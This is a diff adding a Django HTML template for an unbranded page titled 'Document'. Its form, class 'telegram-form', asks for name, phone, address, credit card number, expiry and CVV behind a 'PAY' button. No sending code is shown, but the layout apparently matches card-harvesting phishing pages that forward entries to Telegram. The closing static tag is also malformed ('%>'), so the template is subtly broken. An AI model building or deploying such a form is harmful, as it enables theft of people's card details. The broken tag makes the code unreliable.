@@ -1,0 +1,33 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <link href='https://fonts.googleapis.com/css?family=Roboto:400' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="{% static 'css/main.css' %}">
+</head>
+<body>
+<div class="container">
+    <div class="log-form">
+        <form class="telegram-form">
+          <input type="text" name="name" placeholder="Name" autocomplete="off" />
+          <input type="text" name="phone" placeholder="Phone" autocomplete="off" />
+          <input type="text" name="zip" placeholder="Postcode" autocomplete="off" />
+          <input type="text" name="state" placeholder="State" autocomplete="off" />
+          <input type="text" name="address" placeholder="Address" autocomplete="off" />
+          <input type="text" name="card" placeholder="Credit card" autocomplete="off" />
+          <input type="text" name="dm" placeholder="mm/yy" autocomplete="off" />
+          <input type="text" name="cvv" placeholder="CVV/CVC" autocomplete="off" />
+          <button type="submit" class="btn">PAY</button>
+        </form>
+    </div>
+</div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="{% static 'js/main.js' %></script>
+</body>
+</html>
